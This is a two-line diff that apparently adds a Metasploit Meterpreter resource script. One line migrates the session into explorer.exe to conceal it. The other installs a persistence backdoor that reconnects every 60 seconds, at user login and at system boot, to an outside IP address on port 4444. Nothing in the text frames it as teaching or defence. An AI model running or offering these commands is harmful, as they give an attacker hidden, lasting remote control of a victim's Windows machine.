@@ -1,0 +1,2 @@
+run migrate -n explorer.exe
+run persistence -U -X -i 60 -p 4444 -r 52.33.152.185
